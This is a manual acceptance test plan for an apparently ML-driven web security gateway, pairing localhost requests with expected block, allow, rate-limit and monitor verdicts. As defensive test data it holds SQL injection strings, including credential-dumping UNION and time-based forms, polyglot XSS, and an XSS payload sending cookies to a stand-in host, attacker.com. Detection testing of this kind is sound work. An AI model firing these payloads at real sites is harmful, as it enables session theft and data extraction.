# Manual UAT Test Cases: AI-Based Adaptive Security Gateway

This document provides a set of rigorous, real-world test cases designed to manually validate the security gateway using Postman, Thunder Client, or `curl`. Each test targets specific subsystems across ML detection, Threat Intelligence, Device Profiling, Session Management, and Policy Overrides.

---

## 🚫 Test Suite A: Scenarios Resulting in BLOCK (HTTP 403 Forbidden)
*At least 6 distinct real-world attack vectors and policy conditions triggering rejection at the perimeter.*

### Test A.1: Classical & Obfuscated SQL Injection (Tautology / Union)
* **Goal**: Validate ML zero-tolerance block on evasion comments and union keywords.
* **Method**: `POST`
* **URL**: `http://127.0.0.1:5000/predict`
* **Headers**: `Content-Type: application/json`
* **Body**:
  ```json
  {
      "payload": "admin' OR '1'='1' UNION ALL SELECT null, username, password FROM users-- -",
      "ip": "198.51.100.11"
  }
  ```
* **Expected Result**: `HTTP 403 Forbidden`
* **Validation Check**:
  - `verdict`: `"BLOCK"`
  - `label`: `"sqli"`
  - `confidence`: `>= 0.90`
  - `policy_override.override_reason`: Matches `"Zero-Tolerance Policy: High-confidence SQLI"`

---

### Test A.2: Hex / Nested URL-Encoded SQL Injection Evasion
* **Goal**: Validate recursive multi-stage URL canonicalizer (`%2527` -> `'`) feeding into ML model.
* **Method**: `POST`
* **URL**: `http://127.0.0.1:5000/predict`
* **Headers**: `Content-Type: application/json`
* **Body**:
  ```json
  {
      "payload": "id=1%2527%2520UNION%2520SELECT%25201,version(),3%2523",
      "ip": "198.51.100.12"
  }
  ```
* **Expected Result**: `HTTP 403 Forbidden`
* **Validation Check**:
  - `verdict`: `"BLOCK"`
  - `data.detection.label`: `"sqli"`
  - Shows that canonicalizer unpacked nested percent encodings before ML inference.

---

### Test A.3: HTML5 Event-Handler Cross-Site Scripting (XSS)
* **Goal**: Validate zero-tolerance detection on modern scriptless DOM/HTML5 injection payloads.
* **Method**: `POST`
* **URL**: `http://127.0.0.1:5000/predict`
* **Headers**: `Content-Type: application/json`
* **Body**:
  ```json
  {
      "payload": "<svg/onload=fetch('http://attacker.com/steal?cookie='+document.cookie)>",
      "ip": "198.51.100.13"
  }
  ```
* **Expected Result**: `HTTP 403 Forbidden`
* **Validation Check**:
  - `verdict`: `"BLOCK"`
  - `label`: `"xss"`
  - `risk_level`: `"CRITICAL"`
  - `incident_id`: Valid non-null identifier recorded in database.

---

### Test A.4: Polyglot XSS with Null-Byte Injection & Javascript URI
* **Goal**: Validate stripping of control/null characters (`%00`) and javascript pseudo-protocol blocking.
* **Method**: `POST`
* **URL**: `http://127.0.0.1:5000/predict`
* **Headers**: `Content-Type: application/json`
* **Body**:
  ```json
  {
      "payload": "javascript:%00/*--></title></style></textarea></script><img src=x onerror=alert(document.domain)>",
      "ip": "198.51.100.14"
  }
  ```
* **Expected Result**: `HTTP 403 Forbidden`
* **Validation Check**:
  - `verdict`: `"BLOCK"`
  - `label`: `"xss"`
  - Incident logged with cleaned payload representation.

---

### Test A.5: Active Offensive Security Tool (sqlmap / nikto)
* **Goal**: Validate Policy Engine Rule 5 (Offensive Scanner combined with attack payload triggers immediate termination).
* **Method**: `POST`
* **URL**: `http://127.0.0.1:5000/predict`
* **Headers**:
  - `Content-Type: application/json`
  - `User-Agent`: `sqlmap/1.7.2#stable (https://sqlmap.org)`
* **Body**:
  ```json
  {
      "payload": "1 AND 1=1 AND '%'='",
      "ip": "198.51.100.15"
  }
  ```
* **Expected Result**: `HTTP 403 Forbidden`
* **Validation Check**:
  - `data.device_profile.is_scanner`: `true`
  - `data.device_profile.scanner_name`: `"sqlmap"`
  - `policy_override.override_reason`: Contains `"Offensive Tooling: sqlmap executing SQLI attack"`

---

### Test A.6: Flagged Malicious Threat Actor / Tor Exit Node Launching Attack
* **Goal**: Validate Policy Engine Rule 6 (Known malicious reputation node executing exploit).
* **Method**: `POST`
* **URL**: `http://127.0.0.1:5000/predict`
* **Headers**: `Content-Type: application/json`
* **Body**:
  ```json
  {
      "payload": "admin' OR SLEEP(5)--",
      "ip": "185.220.101.5"
  }
  ```
* **Expected Result**: `HTTP 403 Forbidden`
* **Validation Check**:
  - `data.threat_intel.is_known_malicious`: `true`
  - `data.threat_intel.category`: `"Tor Exit Node"`
  - `data.threat_intel.reputation_score`: `95.0`
  - `policy_override.override_reason`: Contains `"Threat Intelligence: Flagged malicious IP"`

---

### Test A.7: SOC Analyst Hard Blacklist Override
* **Goal**: Validate human analyst zero-tolerance blacklist overriding even benign payloads (Rule 2).
* **Step 1**: Send policy override to blacklist IP:
  - `POST http://127.0.0.1:5000/api/policy/override-ip`
  - Body: `{"ip": "203.0.113.88", "action": "BLACKLIST", "reason": "Compromised credential host"}`
* **Step 2**: Submit an innocent, clean request from that IP:
  - `POST http://127.0.0.1:5000/predict`
  - Body:
    ```json
    {
        "payload": "Hello, I want to view my profile page.",
        "ip": "203.0.113.88"
    }
    ```
* **Expected Result**: `HTTP 403 Forbidden`
* **Validation Check**:
  - `verdict`: `"BLOCK"`
  - `data.policy_override.override_applied`: `true`
  - `data.policy_override.override_reason`: `"Analyst Policy Override: IP is explicitly blacklisted"`

---

## ✅ Test Suite B: Scenarios Resulting in ALLOW (HTTP 200 OK)
*At least 6 distinct legitimate application traffic patterns and whitelisting conditions.*

### Test B.1: Legitimate Search Query with Quotes and Punctuation
* **Goal**: Verify false-positive resistance against punctuation, apostrophes, and plain search grammar.
* **Method**: `POST`
* **URL**: `http://127.0.0.1:5000/predict`
* **Headers**: `Content-Type: application/json`
* **Body**:
  ```json
  {
      "payload": "Men's fashion & leather jackets in size L",
      "ip": "192.168.1.10"
  }
  ```
* **Expected Result**: `HTTP 200 OK`
* **Validation Check**:
  - `verdict`: `"ALLOW"`
  - `label`: `"benign"`
  - `risk_score`: `< 40.0` (typically `0.0` - `5.0`)
  - `risk_level`: `"LOW"`

---

### Test B.2: Legitimate Technical / Developer Documentation (Code Snippet)
* **Goal**: Verify ML model does not falsely block technical text or SQL discussion in safe contexts.
* **Method**: `POST`
* **URL**: `http://127.0.0.1:5000/predict`
* **Headers**: `Content-Type: application/json`
* **Body**:
  ```json
  {
      "payload": "Tutorial: How to optimize relational databases using indexes and primary keys",
      "ip": "192.168.1.11"
  }
  ```
* **Expected Result**: `HTTP 200 OK`
* **Validation Check**:
  - `verdict`: `"ALLOW"`
  - `label`: `"benign"`
  - `risk_score`: `< 40.0`

---

### Test B.3: Legitimate Rich HTML / Email Template Submission
* **Goal**: Verify system distinguishes normal markup tags from executable script/event vectors.
* **Method**: `POST`
* **URL**: `http://127.0.0.1:5000/predict`
* **Headers**: `Content-Type: application/json`
* **Body**:
  ```json
  {
      "payload": "<p>Welcome to our newsletter! Please confirm your <b>subscription</b>.</p>",
      "ip": "192.168.1.12"
  }
  ```
* **Expected Result**: `HTTP 200 OK`
* **Validation Check**:
  - `verdict`: `"ALLOW"`
  - `label`: `"benign"`
  - `incident_id`: Valid non-null telemetry identifier recorded in database (triage status: RESOLVED)

---

### Test B.4: Standard Mobile / Desktop Browser Authentication
* **Goal**: Verify realistic browser headers (`User-Agent`, `Accept`) pass device profiling cleanly.
* **Method**: `POST`
* **URL**: `http://127.0.0.1:5000/predict`
* **Headers**:
  - `Content-Type`: `application/json`
  - `User-Agent`: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`
  - `Accept`: `application/json, text/plain, */*`
* **Body**:
  ```json
  {
      "payload": "user=john_doe&action=login",
      "ip": "192.168.1.13"
  }
  ```
* **Expected Result**: `HTTP 200 OK`
* **Validation Check**:
  - `verdict`: `"ALLOW"`
  - `data.device_profile.is_scanner`: `false`
  - `data.device_profile.is_automated_tool`: `false`

---

### Test B.5: Private / Local Subnet Internal API Call
* **Goal**: Validate RFC 1918 private IP ranges and loopbacks are recognized as zero-threat reputation.
* **Method**: `POST`
* **URL**: `http://127.0.0.1:5000/predict`
* **Headers**: `Content-Type: application/json`
* **Body**:
  ```json
  {
      "payload": "status=ok&component=billing-service",
      "ip": "10.0.0.45"
  }
  ```
* **Expected Result**: `HTTP 200 OK`
* **Validation Check**:
  - `verdict`: `"ALLOW"`
  - `data.threat_intel.category`: `"private"`
  - `data.threat_intel.reputation_score`: `0.0`

---

### Test B.6: SOC Analyst Whitelist Override (VIP / Partner Bypass)
* **Goal**: Validate Policy Engine Rule 1 (Analyst Whitelist has top authority and forces `ALLOW`).
* **Step 1**: Whitelist a specific IP:
  - `POST http://127.0.0.1:5000/api/policy/override-ip`
  - Body: `{"ip": "203.0.113.77", "action": "WHITELIST", "reason": "Authorized Pentest Consultant"}`
* **Step 2**: Send an aggressive payload from that whitelisted IP:
  - `POST http://127.0.0.1:5000/predict`
  - Body:
    ```json
    {
        "payload": "admin' OR 1=1--",
        "ip": "203.0.113.77"
    }
    ```
* **Expected Result**: `HTTP 200 OK`
* **Validation Check**:
  - `verdict`: `"ALLOW"`
  - `data.policy_override.override_applied`: `true`
  - `data.policy_override.override_reason`: `"Analyst Policy Override: IP is explicitly whitelisted"`

---

## ⏳ Test Suite C: Scenarios Resulting in RATE_LIMIT (HTTP 429) & MONITOR

### Test C.1: Velocity Surge / Brute Force (Sliding Window Violation)
* **Goal**: Validate sliding-window rate limit triggers when requests exceed 20 within 10 seconds.
* **Method**: `POST`
* **URL**: `http://127.0.0.1:5000/predict`
* **Headers**: `Content-Type: application/json`
* **Body**:
  ```json
  {
      "payload": "login attempt",
      "ip": "203.0.113.15"
  }
  ```
* **Execution**: Send 25 rapid requests within 5 seconds (via script or Postman runner).
* **Expected Result**: First 20 return `HTTP 200 OK`; requests 21-25 return **`HTTP 429 Too Many Requests`**.
* **Validation Check**:
  - `verdict`: `"RATE_LIMIT"`
  - `data.session.is_rate_exceeded`: `true`
  - `data.session.requests_last_10s`: `> 20`

---

### Test C.2: Elevated Risk in Safe Buffer Zone (MONITOR Verdict)
* **Goal**: Validate requests that have minor anomalies (Risk 40 - 79) are allowed through with a `MONITOR` tag.
* **Method**: `POST`
* **URL**: `http://127.0.0.1:5000/predict`
* **Headers**:
  - `Content-Type: application/json`
  - `User-Agent`: `python-requests/2.31.0`
* **Body**:
  ```json
  {
      "payload": "fetch report status",
      "path": "/server-status",
      "ip": "203.0.113.50"
  }
  ```
* **Expected Result**: `HTTP 200 OK`
* **Validation Check**:
  - `verdict`: `"MONITOR"`
  - `risk_level`: `"MEDIUM"` or `"HIGH"`
  - `risk_score`: Between `40.0` and `79.9`
  - Request is allowed without interrupting client, but tagged for SOC triage.

---

## 📊 Summary Test Matrix

| Test ID | Scenario | Input Vector | Expected Status | Final Verdict | Primary Engine Triggered |
| :--- | :--- | :--- | :---: | :---: | :--- |
| **A.1** | Classical SQLi | `admin' OR '1'='1' UNION...` | **403** | `BLOCK` | ML Engine (Zero-Tolerance) |
| **A.2** | Double URL-Encoded SQLi | `%2527%2520UNION...` | **403** | `BLOCK` | Canonicalizer + ML Engine |
| **A.3** | HTML5 Event XSS | `<svg/onload=fetch(...)>` | **403** | `BLOCK` | ML Engine (XSS Classifier) |
| **A.4** | Null-Byte Obfuscated XSS | `javascript:%00<img onerror...>` | **403** | `BLOCK` | Preprocessor + ML Engine |
| **A.5** | Security Scanner Exploit | `User-Agent: sqlmap/1.7` + SQLi | **403** | `BLOCK` | Device Profiler + Policy Rule 5 |
| **A.6** | Malicious Tor Exit Node Attack | `185.220.101.5` + SQLi | **403** | `BLOCK` | Threat Intel + Policy Rule 6 |
| **A.7** | SOC Analyst Blacklist | Benign text from blacklisted IP | **403** | `BLOCK` | Policy Engine Override (Rule 2) |
| **B.1** | Punctuation / Quotes in Search | `Men's fashion & leather...` | **200** | `ALLOW` | ML Engine (Benign classification) |
| **B.2** | Technical SQL Documentation | `How to optimize databases...` | **200** | `ALLOW` | ML Model (Context awareness) |
| **B.3** | Clean HTML Template | `<p>Welcome...<b>subscription</b></p>` | **200** | `ALLOW` | ML Model (Benign HTML) |
| **B.4** | Legitimate Browser Auth | Standard Chrome UA + clean credentials | **200** | `ALLOW` | Device Profiler & ML Model |
| **B.5** | Internal Subnet RFC 1918 | Private IP `10.0.0.45` | **200** | `ALLOW` | Threat Intel (Bogon / Private) |
| **B.6** | SOC Whitelist Override | Malicious SQLi from Whitelisted IP | **200** | `ALLOW` | Policy Engine Override (Rule 1) |
| **C.1** | Rapid Velocity Surge | 25 requests in < 10s | **429** | `RATE_LIMIT` | Session Manager Sliding Window |
| **C.2** | Elevated Anomaly Score | Sensitive path `/server-status` + Python | **200** | `MONITOR` | Decision Engine (Score 40-79) |
